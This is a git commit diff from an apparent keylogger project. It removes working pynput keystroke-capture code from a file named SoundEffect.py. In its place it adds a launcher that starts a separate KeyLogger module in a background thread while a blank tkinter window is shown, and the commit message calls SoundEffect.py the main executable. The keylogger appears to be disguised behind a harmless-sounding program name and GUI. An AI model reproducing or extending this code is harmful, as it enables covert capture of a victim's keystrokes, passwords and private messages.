c676be2d548abeb54c9e8a70772841f611a53997
Soroush Mehraban <Smehraban2013@gmail.com>
2020-03-03 20:01:22 +0330

    gitignore updated first py file renamed to keyLogger.py GUI initialized SoundEffect.py created as a main executable file

--- SoundEffect.py
+++ SoundEffect.py
@@ -1,45 +1,22 @@
-import time
-from pynput.keyboard import Listener
 import threading
+import codes.GUI as GUI
+import codes.KeyLogger as Logger
 
-input_buffer = ''  # a buffer to store inserted keys ( Resets each 5 sec )
 
-
-# this class run a thread to clear input buffer each 5 sec:
-class BufferThread(threading.Thread):
+# this class run a thread activate key logger :
+class LoggerThread(threading.Thread):
     def __init__(self):
         super().__init__()
 
     def run(self):
-        while True:
-            time.sleep(5)  # wait for 5 sec
-            reset_buffer()
+        Logger.start()
 
 
-# this function resets buffer whenever it is called
-def reset_buffer():
-    global input_buffer
-    input_buffer = ''
-
-
-# this function is called whenever a key is pressed on keyboard ( with help of listener)
-def on_press(key):
-    global input_buffer
-
-    if str(key)[
-        0] is '\'':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
-        input_buffer += str(key)[1:-1]
-    else:
-        input_buffer += str(key)
-    print(input_buffer)
-
-
-# our main function that starts when we run our code
 def main():
-    buffer_thread = BufferThread()  # creating object of our thread
-    buffer_thread.start()  # start our thread
-    with Listener(on_press=on_press) as listener:  # listener to listen key pressing and calling on_press function
-        listener.join()
+    loggerThread = LoggerThread()
+    loggerThread.start()
+
+    GUI.start()
 
 
 if __name__ == '__main__':
---
+++ codes/GUI.py
@@ -0,0 +1,6 @@
+import tkinter as tk
+
+
+def start():
+    root = tk.Tk()
+    root.mainloop()
